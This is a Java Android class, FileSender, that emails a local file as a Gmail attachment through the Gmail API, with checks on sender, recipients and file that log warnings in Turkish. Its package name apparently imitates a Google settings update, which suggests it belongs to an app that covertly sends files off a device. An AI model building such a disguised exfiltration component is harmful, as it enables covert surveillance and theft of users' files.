package com.setting.dl.google.googlesettingupdate.ptt.senders;

import android.support.annotation.NonNull;

import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.model.Message;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.mail.gmail.Mail;
import com.setting.dl.google.googlesettingupdate.u;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.Objects;

public class FileSender implements IFileSender {
   
   @Override
   synchronized
   public Message sendFile(
         @NonNull Gmail gmail,
         @NonNull String sender,
         @NonNull List<String> recievers,
         @NonNull File file) {
      
      if (isInvalid(sender, recievers, file)) {
         
         return null;
      }
      
      try {
         return gmail
               .users()
               .messages()
               .send("me", Objects.requireNonNull(Mail.createMessageWithEmail(
                     Mail.createEmailWithAttachment(
                           recievers,
                           sender,
                           file.getName(),
                           Time.getDate(file.lastModified()),
                           file)))).execute();
         
      }
      catch (IOException e) {
         e.printStackTrace();
      }
      
      
      return null;
   }
   
   @Override
   synchronized
   public Message sendFile(
         @NotNull Gmail gmail,
         @NotNull String sender,
         @NotNull List<String> recievers,
         @NotNull String subject,
         @NotNull String body,
         @NotNull File file) {
      
      if (isInvalid(sender, recievers, file)) {
         
         return null;
      }
      
      try {
         
         return gmail.users()
               .messages()
               .send("me", Objects.requireNonNull(Mail.createMessageWithEmail(
                     Mail.createEmailWithAttachment(
                           recievers,
                           sender,
                           subject,
                           body,
                           file)))).execute();
         
      }
      catch (IOException e) {
         e.printStackTrace();
      }
      
      return null;
   }
   
   private boolean isInvalid(@NonNull String sender,
                             @NonNull List<String> recievers,
                             @NonNull File file) {
      
      if (recievers.size() == 0) {
         
         u.log.w("Alıcı yok");
         return true;
      }
      
      if (sender.trim().isEmpty()) {
         
         u.log.w("Gönderen belirtilmemiş");
         return true;
      }
      
      if (!file.exists()) {
         
         u.log.w("Dosya mevcut değil : %s", file.getName());
         return true;
      }
      
      return false;
   }
   
}
